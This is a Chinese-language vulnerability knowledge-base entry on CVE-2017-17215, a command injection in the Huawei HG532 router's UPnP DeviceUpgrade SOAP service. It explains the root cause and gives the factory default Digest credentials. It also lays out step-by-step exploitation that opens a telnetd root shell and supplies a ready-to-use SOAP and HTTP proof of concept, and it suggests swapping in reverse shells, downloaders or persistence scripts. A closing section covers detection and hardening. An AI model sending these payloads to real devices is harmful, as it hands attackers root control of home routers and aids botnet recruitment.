---
id: iot-protocol-huawei-hg532-upnp-deviceupgrade-command-injection
title: 华为 HG532 UPnP DeviceUpgrade SOAP 命令注入
type: scenario
domain: iot
path: iot/protocol
technique: upnp-soap-command-injection
aliases:
- CVE-2017-17215
- HG532 RCE
- DeviceUpgrade_1 命令注入
- 华为路由器 UPnP 注入
tags:
- iot
- upnp
- soap
- command-injection
- huawei
- router
- firmware
- cve-2017-17215
cve:
- CVE-2017-17215
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-B
  verified_at: '2026-11-04T18:45:57+08:00'
  notes: 已对照原文与 28 张截图核对：dispatcher 查表链、snprintf/system 代码、Digest 默认凭据、SOAPAction/URN、telnetd 注入与 54 秒超时均一致；原文仅给设备型号和固件包名，未给受影响版本区间（未验证点：未独立复现）
---

## 一句话结论

华为 HG532 的 `upnp` 进程在处理 `/ctrlt/DeviceUpgrade_1` SOAP 请求时，把 `NewDownloadURL` 与 `NewStatusURL` 原样拼进 `upg ...` 命令并交给 `system()`，攻击者用 `;命令;` 即可在路由器上以 root 权限执行任意命令。

## 原理

- UPnP 请求进入 dispatcher 后，通过 action 名查表：`UPnPGetActionByName` 在 `g_astActionArray` 中找到 `Upgrade`，返回处理函数地址，再由 `move $t9, $s1; jalr $t9` 间接调用。
- 处理函数用 `ATP_XML_GetChildNodeByName` 从 SOAP XML 中取出 `NewDownloadURL`、`NewStatusURL` 两个子节点的文本，只检查非空，不检查内容。
- 随后执行 `snprintf(buf, 0x400, "upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -b", NewDownloadURL, NewStatusURL)`，再 `system(buf)`。
- `system()` 调用 `/bin/sh -c`，`;`、`$(...)`、反引号都会重新获得命令分隔/替换语义。两个 `%s` 都来自攻击者，故形成命令注入。
- `upnp` 以 root 运行，注入命令继承 root 权限。认证层是 HTTP Digest，但设备保留出厂默认凭据，等于可绕过。

## 触发条件

- 目标暴露 TCP 37215（HG532 UPnP 服务），LAN 侧默认可达；公网暴露的设备同样可打。
- 使用出厂默认 Digest 凭据 `dslf-config:admin`，realm 为 `HuaweiHomeGateway`。
- SOAPAction 与服务 URN 必须匹配：`urn:www-huawei-com:service:DeviceUpgrade:1#Upgrade`。
- 请求体必须同时包含非空的 `NewDownloadURL` 与 `NewStatusURL`。

## 利用步骤

1. 向 `/ctrlt/DeviceUpgrade_1` 发一个未认证 POST，读取 `401` 响应里的 `nonce`。
2. 用默认凭据计算 Digest：`HA1=MD5(user:realm:pass)`，`HA2=MD5(POST:/ctrlt/DeviceUpgrade_1)`，`response=MD5(HA1:nonce:nc:cnonce:auth:HA2)`。
3. 带 `Authorization: Digest ...` 重发，`NewStatusURL` 填 `;telnetd -p 9999;`（或 `;echo PWNED > /tmp/pwned;`）。
4. `system()` 会阻塞等待 telnetd，HTTP 可能超时，这是正常现象。
5. 约 1 分钟内连接 9999 端口；telnetd 的约 54 秒超时退出前可拿到 shell。设备若把 `/bin/cli` 换成 `/bin/sh`，连接后直接是 root shell。

## PoC

```xml
<?xml version="1.0" ?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
            s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:Upgrade xmlns:u="urn:www-huawei-com:service:DeviceUpgrade:1">
      <NewStatusURL>;echo PWNED > /tmp/pwned;</NewStatusURL>
      <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
    </u:Upgrade>
  </s:Body>
</s:Envelope>
```

```http
POST /ctrlt/DeviceUpgrade_1 HTTP/1.0
Host: target:37215
Content-Type: text/xml
SOAPAction: "urn:www-huawei-com:service:DeviceUpgrade:1#Upgrade"
Authorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="...", uri="/ctrlt/DeviceUpgrade_1", qop=auth, nc=00000001, cnonce="...", response="...", algorithm=MD5
Content-Length: <len>

<上面的 SOAP XML>
```

注意：精简 busybox 可能没有 `touch`/`id`/`uname`，验证时优先用 `echo`、`ls`、`cat` 等内置命令。

## 变体与关联

- 变体：`$(cmd)`、反引号、`&&`、`||` 均可作为注入分隔；命令可换成反弹 shell、下载器或持久化脚本。
- 变体：把 `telnetd -p` 换成设备上可用的任意监听/后门程序；也可直接写文件改配置。
- 关联：Satori/OKIRU 等 Mirai 变种曾大规模利用该漏洞；同类 UPnP SOAP 服务常把 XML 字段拼进 `system()`。
- 关联：[[code-analysis-reverse-firmware-huawei-squashfs-mips-emulation]] 提供该固件的解包与仿真方法。

## 检测与防御

- 检测：对 37215 端口的扫描与 POST `/ctrlt/DeviceUpgrade_1`；SOAPAction 含 `DeviceUpgrade`；XML 字段中出现 `;`、`$(`、反引号、`telnetd`、`/bin/sh`。
- 检测：设备侧异常子进程、9999 等非预期监听端口、向外的反弹连接；`upnp` 进程长时间阻塞在 `system()`。
- 修复：升级到厂商修复版本，或淘汰停产设备；无法升级时在边界封禁 37215 与 UPnP 相关端口。
- 加固：修改出厂默认凭据，关闭 WAN 侧 UPnP，把设备管理面限制在可信网段；运营商侧对 CPE 做准入与版本核查。
- 注意：仅改密码不能修复命令注入，只是提高利用门槛；根因是未过滤拼接 `system()`。
